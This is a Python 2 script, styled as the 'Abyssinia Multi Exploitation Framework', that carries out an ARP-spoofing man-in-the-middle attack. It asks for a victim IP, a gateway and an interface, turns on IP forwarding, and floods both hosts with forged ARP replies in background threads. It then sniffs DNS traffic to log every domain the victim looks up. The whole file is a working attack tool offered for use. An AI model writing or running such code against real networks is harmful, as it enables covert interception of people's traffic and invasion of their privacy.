#!/usr/bin/env python
 
from scapy.all import *
import threading
import os
import sys

class colors:
    WHITE = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    RED = '\033[93m'
    YELLOW = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

print"  ___  _                   _       _       "
print" / _ \| |                 (_)     (_)      "
print"/ /_\ \ |__  _   _ ___ ___ _ _ __  _  __ _ "
print"|  _  | '_ \| | | / __/ __| | '_ \| |/ _` |"
print"| | | | |_) | |_| \__ \__ \ | | | | | (_| |"
print"\_| |_/_.__/ \__, |___/___/_|_| |_|_|\__,_|"
print"              __/ |                        "
print"             |___/                         \n"

print colors.GREEN + " Abyssinia Multi Exploitation Framework" + colors.ENDC
print colors.YELLOW + "        Ethiopian Cyber sword" + colors.ENDC
print colors.RED + "         Mati Ethiopia 2010" + colors.ENDC
print ""


victimIP = raw_input('Enter the IP address of the victim computer: ')
gatewayIP = raw_input('Enter the IP address of the gateway: ')
Interface = raw_input('Enter the name of your interface: ')

print  colors.BLUE + "\t\t\nStarting Port forwarding ......."+ colors.ENDC

os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
print "\n"
print colors.GREEN + "Victim computer" + colors.ENDC
print victimIP 
print colors.YELLOW + "Gateway IP" + colors.ENDC
print gatewayIP
print colors.RED + "Interface" + colors.ENDC
print Interface
print ""


#for OSX
#os.system('sysctl -w net.inet.ip.forwarding=1')

def dnshandle(pkt):
                if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0: 
                        print 'Victim: ' + victimIP + ' has searched for: ' + pkt.getlayer(DNS).qd.qname
 
 
def v_poison():
        v = ARP(pdst=victimIP, psrc=gatewayIP)
        while True:
                try:   
                       send(v,verbose=0,inter=1,loop=1)
                except KeyboardInterupt:                  
                         sys.exit(1)
def gw_poison():
        gw = ARP(pdst=gatewayIP, psrc=victimIP)
        while True:
                try:
                       send(gw,verbose=0,inter=1,loop=1)
                except KeyboardInterupt:
                        sys.exit(1)
 
vthread = []
gwthread = []  
 
 
while True:  
               
        vpoison = threading.Thread(target=v_poison)
        vpoison.setDaemon(True)
        vthread.append(vpoison)
        vpoison.start()        
       
        gwpoison = threading.Thread(target=gw_poison)
        gwpoison.setDaemon(True)
        gwthread.append(gwpoison)
        gwpoison.start()
 
       
        pkt = sniff(iface=Interface,filter='udp port 53',prn=dnshandle)
